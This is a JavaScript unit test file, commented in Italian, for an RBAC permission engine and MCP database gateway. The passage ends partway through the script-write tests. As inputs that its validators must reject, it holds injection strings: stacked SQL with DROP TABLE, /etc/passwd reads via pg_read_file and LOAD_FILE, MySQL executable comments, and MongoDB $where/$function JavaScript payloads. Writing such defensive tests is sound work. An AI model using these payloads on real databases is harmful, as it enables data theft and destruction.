'use strict';

// Test unitari del motore RBAC: classificazione delle operazioni, decisione dei
// permessi e Proxy autorizzante sulle strategie. Nessun database e nessun
// socket: sono eseguiti anche da `npm test`.
// Il gate HTTP del gateway MCP è provato a parte in test/unit-mcp-auth.js.

const assert = require('assert');

const { ROOT_PRINCIPAL, makePrincipal } = require('../auth/principal');
const {
  eventCapability, matchesAny, analyzeSql, sqlCapability,
  isWriteMongoPipeline, analyzeMongoPipeline, assertNoMongoServerJs,
} = require('../auth/capabilities');
const { can, allowedConnections, canUseConnection, canWholeConnection } = require('../auth/permissions');
const { guardStrategy, scopeEffettivamenteLimitato } = require('../auth/guardStrategy');
const {
  assertReadOnlySql, assertWriteSql, assertReadOnlyPipeline,
  refreshSessionPrincipal, refreshWritesAllowed,
  credentialFingerprint, sameMcpIdentity, backupVerificationPayload,
  resolveBackupSelection, hasTopLevelSqlKeyword,
} = require('../mcp/McpGateway');

console.log('--- Test Unitari RBAC ---');

/* --- Classificazione degli eventi -------------------------------------------- */

assert.strictEqual(eventCapability('collection:find', {}, null), 'read');
assert.strictEqual(eventCapability('doc:insert', {}, null), 'write');
assert.strictEqual(eventCapability('doc:delete', {}, null), 'delete');
assert.strictEqual(eventCapability('collection:deleteMany', {}, null), 'delete');
assert.strictEqual(eventCapability('db:drop', {}, null), 'ddl');
assert.strictEqual(eventCapability('index:create', {}, null), 'ddl');
assert.strictEqual(eventCapability('mongo:disconnect', {}, null), null, 'eventi non classificati non richiedono capability');
// collection:aggregate è ambiguo: dipende da strategia e codice, come per l'audit.
const sqlSess = { strategy: { type: 'mysql' } };
const mongoSess = { strategy: { type: 'mongodb' } };
assert.strictEqual(eventCapability('collection:aggregate', { pipeline: 'SELECT 1' }, sqlSess), 'read');
assert.strictEqual(eventCapability('collection:aggregate', { pipeline: 'DELETE FROM t' }, sqlSess), 'delete');
assert.strictEqual(eventCapability('collection:aggregate', { pipeline: 'DROP TABLE t' }, sqlSess), 'ddl');
assert.strictEqual(eventCapability('collection:aggregate', { pipeline: "SELECT pg_read_file('/etc/passwd')" }, sqlSess), 'write');
assert.strictEqual(eventCapability('collection:aggregate', { pipeline: '[{"$match":{}}]' }, mongoSess), 'read');
assert.strictEqual(eventCapability('collection:aggregate', { pipeline: '[{"$out":"copia"}]' }, mongoSess), 'write');
assert.strictEqual(eventCapability('collection:aggregate', { pipeline: '[{"\\u0024out":"copia"}]' }, mongoSess), 'write');
console.log('  OK   Classificazione eventi → capability');

/* --- Analisi strutturata SQL e MongoDB -------------------------------------- */

assert.deepStrictEqual(analyzeSql('SELECT 1').capabilities, ['read']);
assert.deepStrictEqual(
  analyzeSql('UPDATE t SET x = 1 RETURNING segreto').capabilities,
  ['read', 'write'],
  'SQL Raw mutativo richiede sempre anche read',
);
assert.deepStrictEqual(
  analyzeSql('DELETE FROM t WHERE id = 1 RETURNING segreto').capabilities,
  ['read', 'delete'],
);
assert.deepStrictEqual(
  analyzeSql('CREATE TABLE copia AS SELECT * FROM segreti').capabilities,
  ['read', 'ddl'],
);
assert.strictEqual(sqlCapability('INSERT INTO t (x) VALUES (1)'), 'write');
assert.strictEqual(sqlCapability('DELETE FROM t WHERE id = 1'), 'delete');
assert.strictEqual(sqlCapability('DROP TABLE t'), 'ddl');
assert.strictEqual(sqlCapability('WITH eliminati AS (DELETE FROM t RETURNING *) SELECT * FROM eliminati'), 'delete');
const sqlMultiplo = analyzeSql('SELECT 1; DROP TABLE utenti');
assert.strictEqual(sqlMultiplo.multipleStatements, true);
assert.deepStrictEqual(sqlMultiplo.capabilities, ['read', 'ddl']);
assert.strictEqual(sqlCapability('BEGIN'), 'ddl', 'statement ignoto: classificazione conservativa');
const commentoEseguibile = analyzeSql('/*!50000 DELETE FROM utenti */');
assert.strictEqual(commentoEseguibile.executableComment, true);
assert.strictEqual(commentoEseguibile.write, true);
assert.strictEqual(commentoEseguibile.capability, 'ddl');
assert.strictEqual(analyzeSql('/*m!100100 DROP TABLE utenti */').executableComment, true,
  'il marker MariaDB è riconosciuto senza dipendere dalle maiuscole');
assert.strictEqual(analyzeSql('/* commento normale: DELETE FROM utenti */ SELECT 1').executableComment, false);

assert.strictEqual(isWriteMongoPipeline('[{"\\u0024out":"copia"}]'), true,
  'la chiave $out offuscata come escape JSON viene decodificata prima del controllo');
assert.deepStrictEqual(
  analyzeMongoPipeline('[{"$merge":{"into":{"db":"archivio","coll":"ordini"}}}]').targets,
  [{ db: 'archivio', coll: 'ordini', operator: '$merge' }],
);
assert.deepStrictEqual(
  analyzeMongoPipeline(
    '[{"$facet":{"ramo":[{"$lookup":{"from":"clienti","pipeline":[{"$unionWith":"audit"}],"as":"c"}}]}},'
    + '{"$graphLookup":{"from":"categorie","startWith":"$categoria","connectFromField":"parent","connectToField":"_id","as":"g"}}]'
  ).readTargets,
  [
    { db: null, coll: 'clienti', operator: '$lookup' },
    { db: null, coll: 'audit', operator: '$unionWith' },
    { db: null, coll: 'categorie', operator: '$graphLookup' },
  ],
  'le sorgenti lette sono estratte anche dalle pipeline annidate',
);
assert.throws(() => assertNoMongoServerJs('{"\\u0024where":"return true"}'), /\$where/);
assert.throws(() => assertNoMongoServerJs('[{"$project":{"x":{"\\u0024function":{"body":"x","args":[],"lang":"js"}}}}]'), /\$function/);
assert.throws(() => assertNoMongoServerJs('[{"$group":{"x":{"$accumulator":{"init":"x"}}}}]'), /\$accumulator/);
assert.doesNotThrow(() => assertNoMongoServerJs('[{"$match":{"$expr":{"$eq":["$a",1]}}}]'));
console.log('  OK   Analisi SQL/MongoDB strutturata e fail-closed');

/* --- Barriere locali del gateway MCP --------------------------------------- */

assert.doesNotThrow(() => assertReadOnlySql('SELECT 1'));
assert.throws(() => assertReadOnlySql('SELECT 1; DROP TABLE utenti'), /un solo statement/);
assert.throws(() => assertReadOnlySql("SELECT pg_read_file('/etc/passwd')"), /I\/O su file/);
assert.throws(() => assertReadOnlySql('INSERT INTO t (x) VALUES (1)'), /solo query di lettura/);
assert.strictEqual(assertWriteSql('INSERT INTO t (x) VALUES (1)'), 'write');
assert.strictEqual(assertWriteSql('DELETE FROM t WHERE id = 1'), 'delete');
assert.throws(
  () => assertWriteSql("INSERT INTO copie (contenuto) SELECT LOAD_FILE('/etc/passwd')"),
  /non ammette l'I\/O su file/,
);
assert.throws(
  () => assertWriteSql("UPDATE copie SET contenuto = pg_read_file('/etc/passwd') WHERE id = 1"),
  /non ammette l'I\/O su file/,
);
assert.throws(() => assertWriteSql("DELETE FROM t RETURNING 'where'"), /senza clausola WHERE/);
assert.throws(() => assertWriteSql('DELETE FROM t /* WHERE id = 1 */'), /senza clausola WHERE/);
assert.throws(
  () => assertWriteSql('UPDATE t SET x = (SELECT max(y) FROM s WHERE s.id = t.id)'),
  /senza clausola WHERE/,
  'un WHERE dentro una sottoquery non limita le righe aggiornate',
);
assert.throws(
  () => assertWriteSql('DELETE FROM t USING (SELECT id FROM s WHERE attivo = 0) x'),
  /senza clausola WHERE/,
  'un WHERE dentro la sorgente USING non limita le righe cancellate',
);
assert.doesNotThrow(
  () => assertWriteSql('UPDATE t SET x = (SELECT max(y) FROM s WHERE s.id = t.id) WHERE t.id = 1'),
);
assert.doesNotThrow(
  () => assertWriteSql('DELETE FROM t WHERE id IN (SELECT id FROM s WHERE attivo = 0)'),
);
assert.strictEqual(hasTopLevelSqlKeyword('UPDATE t SET x = (SELECT 1 WHERE ok = 1)', 'where'), false);
assert.strictEqual(hasTopLevelSqlKeyword('UPDATE t SET x = (SELECT 1) WHERE id = 1', 'where'), true);
assert.strictEqual(hasTopLevelSqlKeyword('UPDATE t SET x = 1 WHERE id = (1', 'where'), false,
  'parentesi sbilanciate restano fail-closed anche dopo un WHERE top-level');
assert.throws(() => assertWriteSql('DROP TABLE t'), /niente DDL/);
assert.throws(() => assertWriteSql('UPDATE t SET x = 1; DELETE FROM t WHERE id = 1'), /un solo statement/);
assert.doesNotThrow(() => assertReadOnlyPipeline('[{"$match":{"attivo":true}}]'));
assert.throws(() => assertReadOnlyPipeline('[{"\\u0024out":"copia"}]'), /\$out e \$merge/);
assert.throws(
  () => assertReadOnlyPipeline('[{"$project":{"x":{"\\u0024function":{"body":"x","args":[],"lang":"js"}}}}]'),
  /\$function/,
);
console.log('  OK   Gateway MCP: SQL singolo, DML granulare e pipeline senza JavaScript');

const readOnlyLive = { prod: { readOnly: 'false' } };
const liveDbSession = { name: 'prod', writesAllowed: false };
const liveMcpSession = { principal: ROOT_PRINCIPAL };
const liveDeps = { loadConnections: () => readOnlyLive };
assert.strictEqual(refreshWritesAllowed(liveMcpSession, liveDbSession, liveDeps), true);
readOnlyLive.prod.readOnly = false;
assert.strictEqual(refreshWritesAllowed(liveMcpSession, liveDbSession, liveDeps), true,
  'anche il valore booleano false abilita esplicitamente la scrittura');
readOnlyLive.prod.readOnly = 'true';
assert.strictEqual(refreshWritesAllowed(liveMcpSession, liveDbSession, liveDeps), false,
  'la revoca readOnly diventa effettiva senza riaprire la connessione MCP');
assert.strictEqual(liveDbSession.writesAllowed, false);
delete readOnlyLive.prod;
assert.strictEqual(refreshWritesAllowed(liveMcpSession, liveDbSession, liveDeps), false,
  'una connessione salvata rimossa ricade in sola lettura');
console.log('  OK   MCP: flag readOnly riletto a ogni operazione distruttiva');

const sameSubjectRestricted = makePrincipal(
  { _id: 'same-subject', type: 'subuser', ownerId: 'o1' },
  [{ connName: 'prod', capabilities: ['read'], scope: null }],
  ['prod'],
);
const sameSubjectBroad = makePrincipal(
  { _id: 'same-subject', type: 'subuser', ownerId: 'o1' },
  [{ connName: 'prod', capabilities: ['read'], scope: null }],
  null,
);
const restrictedFingerprint = credentialFingerprint('cdb_key_restricted');
const broadFingerprint = credentialFingerprint('cdb_key_broad');
const identitySession = { principal: sameSubjectRestricted, credentialFingerprint: restrictedFingerprint };
assert.strictEqual(sameMcpIdentity(identitySession, sameSubjectRestricted, credentialFingerprint('cdb_key_restricted')), true);
assert.strictEqual(sameMcpIdentity(identitySession, sameSubjectBroad, broadFingerprint), false,
  'due API key dello stesso subject ma con connScope diversi non condividono la sessione MCP');
assert.strictEqual(sameMcpIdentity(identitySession, sameSubjectBroad, restrictedFingerprint), true,
  'la stessa credenziale può ricevere il principal rivalidato dello stesso subject');
console.log('  OK   Sessione MCP vincolata anche alla credenziale, non soltanto al subject');

const verificaPayload = backupVerificationPayload({
  backupId: 'backup-1',
  okCount: 1,
  failedCount: 2,
  unverifiableCount: 1,
  extraCount: 1,
  valid: false,
  details: [
    { file: 'ok.ndjson', status: 'OK' },
    { file: 'missing.ndjson', status: 'MISSING' },
    { file: 'mismatch.ndjson', status: 'CORRUPTED' },
    { file: 'legacy.ndjson', status: 'UNVERIFIABLE' },
    { file: 'extra.ndjson', status: 'UNDECLARED' },
  ],
});
assert.deepStrictEqual(Object.keys(verificaPayload.categories), ['missing', 'mismatch', 'unverifiable', 'extra']);
assert.strictEqual(verificaPayload.missing_files, 1);
assert.strictEqual(verificaPayload.mismatched_files, 1);
assert.strictEqual(verificaPayload.unverifiable_files, 1);
assert.strictEqual(verificaPayload.extra_files, 1);
assert.strictEqual(verificaPayload.valid, false);
console.log('  OK   MCP: verifica backup condivisa con categorie di integrità esplicite');

const backupScelto = resolveBackupSelection('C:\\backup-tenant', 'gruppo_1', '20260814_full');
assert.ok(backupScelto.backupDir.endsWith(require('path').join('gruppo_1', '20260814_full')));
assert.throws(() => resolveBackupSelection('C:\\backup-tenant', '..', '20260814_full'), /non validi/);
assert.throws(() => resolveBackupSelection('C:\\backup-tenant', 'gruppo_1', '..'), /non validi/);
assert.throws(() => resolveBackupSelection('C:\\backup-tenant', 'C:', '20260814_full'), /non validi/);
console.log('  OK   MCP: selezione backup confinata nella radice del tenant');

/* --- Match glob dello scope --------------------------------------------------- */

assert.ok(matchesAny(['orders*'], 'orders_2024'));
assert.ok(!matchesAny(['orders*'], 'customers'));
assert.ok(matchesAny(['*'], 'qualsiasi'));
assert.ok(matchesAny([], 'senza limiti'), 'lista vuota = nessun limite');
assert.ok(matchesAny(['a', 'b*'], 'bravo'));
assert.ok(!matchesAny(['Orders*'], 'orders'), 'il match è case-sensitive');
assert.strictEqual(scopeEffettivamenteLimitato(null), false);
assert.strictEqual(scopeEffettivamenteLimitato({}), false);
assert.strictEqual(scopeEffettivamenteLimitato({ databases: [], collections: [] }), false);
assert.strictEqual(
  scopeEffettivamenteLimitato({ databases: ['shop', '*'], collections: ['ordini', '*'] }),
  false,
  'la presenza di * rende davvero illimitata la dimensione',
);
assert.strictEqual(
  scopeEffettivamenteLimitato({ databases: ['shop'], collections: ['*'] }),
  true,
  'basta una dimensione limitata per attivare la barriera',
);
console.log('  OK   Match glob dello scope');

/* --- Decisione dei permessi --------------------------------------------------- */

const viewer = makePrincipal(
  { _id: 'u1', type: 'subuser', ownerId: 'o1', email: 'v@x.it' },
  [{ connName: 'prod', role: 'viewer', capabilities: ['read'], scope: { databases: ['shop'], collections: ['orders*'] } }],
);
const editor = makePrincipal(
  { _id: 'u2', type: 'subuser', ownerId: 'o1', email: 'e@x.it' },
  [{ connName: 'prod', role: 'editor', capabilities: ['read', 'write'], scope: null }],
);
const owner = makePrincipal({ _id: 'o1', type: 'owner', ownerId: 'o1', email: 'o@x.it' }, []);

assert.ok(can(ROOT_PRINCIPAL, { connName: 'x', capability: 'manage' }), 'root può tutto (RBAC spento)');
assert.ok(can(viewer, { connName: 'prod', capability: 'read', db: 'shop', coll: 'orders_2024' }));
assert.ok(!can(viewer, { connName: 'prod', capability: 'read', db: 'shop', coll: 'customers' }), 'collezione fuori scope');
assert.ok(!can(viewer, { connName: 'prod', capability: 'read', db: 'altro', coll: 'orders' }), 'database fuori scope');
assert.ok(!can(viewer, { connName: 'prod', capability: 'write', db: 'shop', coll: 'orders' }), 'viewer non scrive');
assert.ok(!can(viewer, { connName: 'staging', capability: 'read' }), 'connessione senza grant');
assert.ok(!can(viewer, { capability: 'manage' }), 'nessuna amministrazione senza connessione');
assert.ok(can(editor, { connName: 'prod', capability: 'write', db: 'qualsiasi', coll: 'qualsiasi' }), 'grant senza scope');
assert.ok(!can(editor, { connName: 'prod', capability: 'delete' }), 'editor non cancella');
assert.ok(can(owner, { connName: 'prod', capability: 'manage' }), 'l\'owner amministra il proprio tenant');
console.log('  OK   Decisione dei permessi (can)');

// Le API key possono restringere ulteriormente le connessioni raggiungibili.
const keyOwner = makePrincipal({ _id: 'o1', type: 'owner', ownerId: 'o1', email: 'o@x.it' }, [], ['prod']);
assert.ok(can(keyOwner, { connName: 'prod', capability: 'read' }));
assert.ok(!can(keyOwner, { connName: 'staging', capability: 'read' }), 'connScope della API key rispettato');
assert.deepStrictEqual(allowedConnections(viewer, ['prod', 'staging']), ['prod']);
assert.deepStrictEqual(allowedConnections(owner, ['prod', 'staging']), ['prod', 'staging']);
assert.deepStrictEqual(allowedConnections(keyOwner, ['prod', 'staging']), ['prod']);
assert.ok(canUseConnection(viewer, 'prod') && !canUseConnection(viewer, 'staging'));
// Backup/restore: servono capability e nessuno scope, non applicabile su quel percorso.
assert.ok(!canWholeConnection(viewer, 'prod', 'read'), 'con scope non si fa backup');
assert.ok(canWholeConnection(editor, 'prod', 'read'), 'senza scope il backup è ammesso');
console.log('  OK   API key, filtri e operazioni sull\'intera connessione');

/* --- Proxy autorizzante ------------------------------------------------------- */

function fakeStrategy() {
  const calls = [];
  return {
    type: 'mongodb',
    currentDb: null,
    calls,
    async listDatabases() { return [{ name: 'shop' }, { name: 'altro' }]; },
    async listCollections(db) { calls.push(['listCollections', db]); return [{ name: 'orders' }, { name: 'customers' }]; },
    async dbSchema() {
      return {
        collections: [{ name: 'orders' }, { name: 'customers' }],
        relations: [
          { from: 'orders', to: 'customers' },
          { from: 'orders', to: 'orders', db: 'altro' },
        ],
      };
    },
    async search() { return [{ name: 'shop', collections: [{ name: 'orders' }, { name: 'customers' }] }]; },
    async collectionFind(db, coll) { calls.push(['find', db, coll]); return { docs: [] }; },
    async collectionCount(db, coll) { calls.push(['count', db, coll]); return { total: 0 }; },
    async collectionExplain(db, coll) { calls.push(['explain', db, coll]); return { plan: {} }; },
    async columnRelations() {
      return [
        { campo: 'archive_id', db: 'shop', tabella: 'orders_archive', colonna: '_id' },
        { campo: 'customer_id', db: 'shop', tabella: 'customers', colonna: '_id' },
        { campo: 'remote_id', db: 'altro', tabella: 'orders_remote', colonna: '_id' },
      ];
    },
    async docInsert(db, coll) { calls.push(['insert', db, coll]); return { inserted: 1 }; },
    async renameCollection(db, coll, newName) { calls.push(['rename', db, coll, newName]); return {}; },
    async collectionAggregate(db, coll, payload) { calls.push(['aggregate', payload.pipeline]); return { docs: [] }; },
    async shellWrite(db, coll, payload) { calls.push(['shellWrite', db, coll, payload.op]); return { ok: 1 }; },
    async health() { return { latencyMs: 1 }; },
  };
}

(async () => {
  const raw = fakeStrategy();
  assert.strictEqual(guardStrategy(raw, null), raw, 'senza contesto la strategia non viene avvolta');
  assert.notStrictEqual(
    guardStrategy(raw, { principal: ROOT_PRINCIPAL }),
    raw,
    'anche root attraversa le invarianti MongoDB, pur mantenendo tutti i permessi',
  );

  const guarded = guardStrategy(fakeStrategy(), { principal: viewer, connName: 'prod' });

  assert.strictEqual(guarded.type, 'mongodb', 'le proprietà passano invariate');
  guarded.currentDb = 'shop';
  assert.strictEqual(guarded.currentDb, 'shop', 'la scrittura di currentDb funziona (Query Engine)');
  assert.deepStrictEqual(await guarded.health(), { latencyMs: 1 }, 'i metodi non classificati passano');

  await guarded.collectionFind('shop', 'orders', {});
  await assert.rejects(() => guarded.collectionFind('shop', 'customers', {}), /Permesso negato/, 'lettura fuori scope negata');
  await assert.rejects(() => guarded.docInsert('shop', 'orders', {}), /Permesso negato/, 'scrittura negata al viewer');
  await assert.rejects(() => guarded.collectionFind('altro', 'orders', {}), /Permesso negato/, 'database fuori scope negato');

  // Le liste di navigazione non vengono negate ma filtrate.
  assert.deepStrictEqual(await guarded.listDatabases(), [{ name: 'shop' }], 'listDatabases filtrata');
  assert.deepStrictEqual(await guarded.listCollections('shop'), [{ name: 'orders' }], 'listCollections filtrata');
  const schema = await guarded.dbSchema('shop');
  assert.deepStrictEqual(schema.collections, [{ name: 'orders' }], 'dbSchema filtrato');
  assert.deepStrictEqual(schema.relations, [], 'relazioni verso collezioni nascoste rimosse');
  const found = await guarded.search('o');
  assert.deepStrictEqual(found[0].collections, [{ name: 'orders' }], 'search filtrata');
  assert.deepStrictEqual(
    await guarded.columnRelations('shop', 'orders'),
    [{ campo: 'archive_id', db: 'shop', tabella: 'orders_archive', colonna: '_id' }],
    'i metadati delle relazioni non rivelano target fuori scope',
  );

  // La destinazione di una rename deve rientrare nello scope quanto l'origine.
  const guardedAdmin = guardStrategy(fakeStrategy(), {
    principal: makePrincipal(
      { _id: 'u3', type: 'subuser', ownerId: 'o1', email: 'a@x.it' },
      [{ connName: 'prod', role: 'admin', capabilities: ['read', 'ddl'], scope: { databases: ['shop'], collections: ['orders*'] } }],
    ),
    connName: 'prod',
  });
  await guardedAdmin.renameCollection('shop', 'orders', 'orders_old');
  await assert.rejects(() => guardedAdmin.renameCollection('shop', 'orders', 'clienti'),
    /Permesso negato/, 'rename verso un nome fuori scope negata');

  // collection:aggregate: la stessa firma è lettura o scrittura secondo il codice.
  const guardedEditor = guardStrategy(fakeStrategy(), { principal: editor, connName: 'prod' });
  await guardedEditor.collectionAggregate('shop', 'orders', { pipeline: '[{"$match":{}}]' });
  const guardedViewerAgg = guardStrategy(fakeStrategy(), { principal: viewer, connName: 'prod' });
  await guardedViewerAgg.collectionAggregate('shop', 'orders', { pipeline: '[{"$match":{}}]' });
  await assert.rejects(() => guardedViewerAgg.collectionAggregate('shop', 'orders', { pipeline: '[{"$out":"copia"}]' }),
    /Permesso negato/, 'pipeline di scrittura negata al viewer');
  await assert.rejects(() => guardedViewerAgg.collectionAggregate('shop', 'orders', { pipeline: '[{"\\u0024out":"copia"}]' }),
    /Permesso negato/, 'anche $out codificato come escape JSON viene riconosciuto');

  await guardedViewerAgg.collectionAggregate('shop', 'orders', {
    pipeline: '[{"$lookup":{"from":"orders_archive","localField":"x","foreignField":"x","as":"a"}}]',
  });
  await assert.rejects(
    () => guardedViewerAgg.collectionAggregate('shop', 'orders', {
      pipeline: '[{"$lookup":{"from":"customers","localField":"x","foreignField":"x","as":"c"}}]',
    }),
    /Permesso negato.*customers/,
    '$lookup non legge una collection fuori scope',
  );
  await assert.rejects(
    () => guardedViewerAgg.collectionAggregate('shop', 'orders', {
      pipeline: '[{"$graphLookup":{"from":"customers","startWith":"$x","connectFromField":"x","connectToField":"x","as":"c"}}]',
    }),
    /Permesso negato.*customers/,
    '$graphLookup applica lo scope alla sorgente',
  );
  await assert.rejects(
    () => guardedViewerAgg.collectionAggregate('shop', 'orders', {
      pipeline: '[{"$facet":{"ramo":[{"$unionWith":{"coll":"customers","pipeline":[]}}]}}]',
    }),
    /Permesso negato.*customers/,
    '$unionWith annidato in $facet non scavalca lo scope',
  );

  const mongoSoloWrite = guardStrategy(fakeStrategy(), {
    principal: makePrincipal(
      { _id: 'mongo-write-only', type: 'subuser', ownerId: 'o1' },
      [{ connName: 'prod', role: 'custom', capabilities: ['write'], scope: null }],
    ),
    connName: 'prod',
  });
  await assert.rejects(
    () => mongoSoloWrite.collectionAggregate('shop', 'orders', { pipeline: '[{"$merge":"copia"}]' }),
    /Permesso negato.*lettura/,
    '$merge richiede read sulla sorgente oltre a write',
  );

  // $out/$merge devono essere autorizzati anche sul BERSAGLIO, che può avere
  // collection e database diversi da quelli dichiarati nel payload socket.
  const mongoWriterConScope = guardStrategy(fakeStrategy(), {
    principal: makePrincipal(
      { _id: 'u5', type: 'subuser', ownerId: 'o1', email: 'mw@x.it' },
      [{ connName: 'prod', role: 'editor', capabilities: ['read', 'write'], scope: { databases: ['shop'], collections: ['orders*'] } }],
    ),
    connName: 'prod',
  });
  await mongoWriterConScope.collectionAggregate('shop', 'orders', { pipeline: '[{"$merge":"orders_archivio"}]' });
  await assert.rejects(
    () => mongoWriterConScope.collectionAggregate('shop', 'orders', { pipeline: '[{"$out":"orders_archivio"}]' }),
    /Permesso negato.*cancellazione/,
    '$out sostituisce la destinazione e richiede anche delete',
  );

  const mongoOutWriter = guardStrategy(fakeStrategy(), {
    principal: makePrincipal(
      { _id: 'u6', type: 'subuser', ownerId: 'o1', email: 'mout@x.it' },
      [{ connName: 'prod', role: 'custom', capabilities: ['read', 'write', 'delete'], scope: { databases: ['shop'], collections: ['orders*'] } }],
    ),
    connName: 'prod',
  });
  await mongoOutWriter.collectionAggregate('shop', 'orders', { pipeline: '[{"$out":"orders_archivio"}]' });
  await assert.rejects(
    () => mongoOutWriter.collectionAggregate('shop', 'orders', { pipeline: '[{"$out":"clienti"}]' }),
    /Permesso negato/,
    '$out verso una collection fuori scope viene negato',
  );
  await assert.rejects(
    () => mongoWriterConScope.collectionAggregate('shop', 'orders', {
      pipeline: '[{"$merge":{"into":{"db":"altro","coll":"orders"}}}]',
    }),
    /Permesso negato/,
    '$merge verso un database fuori scope viene negato',
  );

  // Queste primitive eseguono JavaScript nel processo MongoDB e restano
  // vietate anche al principal root: sono invarianti di sicurezza, non grant.
  const guardedRoot = guardStrategy(fakeStrategy(), { principal: ROOT_PRINCIPAL, connName: 'prod' });
  await assert.rejects(
    () => guardedRoot.collectionFind('shop', 'orders', { filter: '{"$where":"return true"}' }),
    /JavaScript lato server/,
  );
  await assert.rejects(
    () => guardedRoot.collectionAggregate('shop', 'orders', {
      pipeline: '[{"$project":{"x":{"$function":{"body":"x","args":[],"lang":"js"}}}}]',
    }),
    /JavaScript lato server/,
  );
  await assert.rejects(
    () => guardedRoot.collectionExplain('shop', 'orders', {
      mode: 'aggregate',
      pipeline: '[{"$group":{"_id":null,"x":{"$accumulator":{"init":"x"}}}}]',
    }),
    /JavaScript lato server/,
  );
  await assert.rejects(
    () => guardedRoot.collectionExplain('shop', 'orders', { mode: 'aggregate', pipeline: '[{"$out":"copia"}]' }),
    /non sono consentiti nel piano/,
  );
  await assert.doesNotReject(
    () => guardedRoot.collectionFind('shop', 'orders', { filter: '{"$expr":{"$eq":["$a",1]}}' }),
  );
  // Le stesse difese che il metodo separato delle righe riferite applicava sul
  // suo `colonna` e sul suo `valore`. Quel metodo non esiste più (ticket 24) e
  // il pannello 🔗 passa dal filtro STRUTTURATO: la superficie da proteggere si
  // è spostata, le difese sono venute dietro. Toglierne una qui riaprirebbe
  // esattamente il buco che il metodo separato teneva chiuso.
  const conCampo = (campo, valore) => ({ condizioni: [{ campo, operatore: 'uguale', valore }] });
  await assert.rejects(
    () => guardedRoot.collectionFind('shop', 'orders', { filtro: conCampo('$where', 'return true') }),
    /nome di campo non valido/,
    'un filtro non può trasformare il nome del campo in un operatore MongoDB',
  );
  await assert.rejects(
    () => guardedRoot.collectionFind('shop', 'orders', { filtro: conCampo('profilo.$expr', 1) }),
    /nome di campo non valido/,
  );
  await assert.rejects(
    () => guardedRoot.collectionFind('shop', 'orders', { filtro: conCampo('profilo\0nome', 1) }),
    /caratteri di controllo/,
  );
  await assert.rejects(
    () => guardedRoot.collectionFind('shop', 'orders', { filtro: conCampo('_id', { $where: 'return true' }) }),
    /JavaScript lato server/,
    'il VALORE di una condizione non può portare un operatore che esegue JS',
  );
  await assert.doesNotReject(
    () => guardedRoot.collectionFind('shop', 'orders', { filtro: conCampo('cliente._id', 42) }),
    'un percorso annidato legittimo deve continuare a passare',
  );

  // Il contesto è mutabile: la revoca a caldo sostituisce il principal e il
  // Proxy deve usare quello nuovo già dalla chiamata successiva.
  const dynamicCtx = { principal: editor, connName: 'prod' };
  const dynamicGuard = guardStrategy(fakeStrategy(), dynamicCtx);
  const dynamicMcpSession = {
    principal: editor,
    dbSessions: new Map([['conn-1', { guardCtx: dynamicCtx }]]),
  };
  await dynamicGuard.docInsert('shop', 'orders', {});
  refreshSessionPrincipal(dynamicMcpSession, viewer);
  assert.strictEqual(dynamicMcpSession.principal, viewer, 'anche il principal della sessione MCP viene aggiornato');
  assert.strictEqual(dynamicCtx.principal, viewer, 'il nuovo principal raggiunge il guardCtx della connessione aperta');
  await assert.rejects(() => dynamicGuard.docInsert('shop', 'orders', {}), /Permesso negato/,
    'la revoca della capability write viene applicata senza riaprire la sessione');
  await dynamicGuard.collectionFind('shop', 'orders', {});
  dynamicCtx.principal = null;
  await assert.rejects(() => dynamicGuard.collectionFind('shop', 'orders', {}), /Sessione non più autorizzata/);
  console.log('  OK   Proxy autorizzante sulle strategie');

  /* --- Scritture da SCRIPT (shellWrite) -------------------------------------- */
  // Uno script MongoDB non deve essere una scorciatoia per i permessi: la
  // capability dipende dall'OPERAZIONE richiesta, e cancellare resta distinto
  // dallo scrivere anche quando la firma del metodo è la stessa.
  {
    const viewerScript = guardStrategy(fakeStrategy(), { principal: viewer, connName: 'prod' });
    await assert.rejects(() => viewerScript.shellWrite('shop', 'orders', { op: 'insertOne', doc: '{}' }),
      /Permesso negato/, 'insert da script negato al viewer');
    await assert.rejects(() => viewerScript.shellWrite('shop', 'orders', { op: 'deleteMany', filter: '{}' }),
      /Permesso negato/, 'delete da script negato al viewer');

    // L'editor ha read+write ma NON delete: deve poter inserire e non cancellare.
    const editorScript = guardStrategy(fakeStrategy(), { principal: editor, connName: 'prod' });
    await editorScript.shellWrite('shop', 'orders', { op: 'insertOne', doc: '{}' });
    await editorScript.shellWrite('shop', 'orders', { op: 'updateMany', filter: '{}', update: '{"$set":{}}' });
    await editorScript.shellWrite('shop', 'orders', {
      op: 'findOneAndUpdate', filter: '{"_id":1}', update: '{"$set":{"x":1}}',
    });
    await assert.rejects(() => editorScript.shellWrite('shop', 'orders', { op: 'deleteMany', filter: '{}' }),
      /Permesso negato/, 'deleteMany da script negato a chi non ha la capability delete');

    const soloWriteScript = guardStrategy(fakeStrategy(), {
      principal: makePrincipal(
        { _id: 'script-write-only', type: 'subuser', ownerId: 'o1' },
        [{ connName: 'prod', role: 'custom', capabilities: ['write'], scope: null }],
      ),
      connName: 'prod',
    });
    await assert.rejects(
      () => soloWriteScript.shellWrite('shop', 'orders', {
        op: 'findOneAndUpdate', filter: '{"_id":1}', update: '{"$set":{"x":1}}',
      }),
      /Permesso negato.*lettura/,
      'findOneAndUpdate restituisce il documento e richiede anche read',
    );
    const soloDeleteScript = guardStrategy(fakeStrategy(), {
      principal: makePrincipal(
        { _id: 'script-delete-only', type: 'subuser', ownerId: 'o1' },
        [{ connName: 'prod', role: 'custom', capabilities: ['delete'], scope: null }],
      ),
      connName: 'prod',
    });
    await assert.rejects(
      () => soloDeleteScript.shellWrite('shop', 'orders', {
        op: 'findOneAndDelete', filter: '{"_id":1}',
      }),
      /Permesso negato.*lettura/,
      'findOneAndDelete richiede read oltre a delete',
    );
    const readDeleteScript = guardStrategy(fakeStrategy(), {
      principal: makePrincipal(
        { _id: 'script-read-delete', type: 'subuser', ownerId: 'o1' },
        [{ connName: 'prod', role: 'custom', capabilities: ['read', 'delete'], scope: null }],
      ),
      connName: 'prod',
    });
    await readDeleteScript.shellWrite('shop', 'orders', {
      op: 'findOneAndDelete', filter: '{"_id":1}',
    });

    // Lo scope vale come per le altre operazioni: fuori perimetro si nega.
    // (`editor` qui sopra non ha scope, quindi serve un principal che ce l'ha.)
    const editorConScope = guardStrategy(fakeStrategy(), {
      principal: makePrincipal(
        { _id: 'u4', type: 'subuser', ownerId: 'o1', email: 'es@x.it' },
        [{ connName: 'prod', role: 'editor', capabilities: ['read', 'write'], scope: { databases: ['shop'], collections: ['orders*'] } }],
      ),
      connName: 'prod',
    });
    await editorConScope.shellWrite('shop', 'orders', { op: 'insertOne', doc: '{}' });
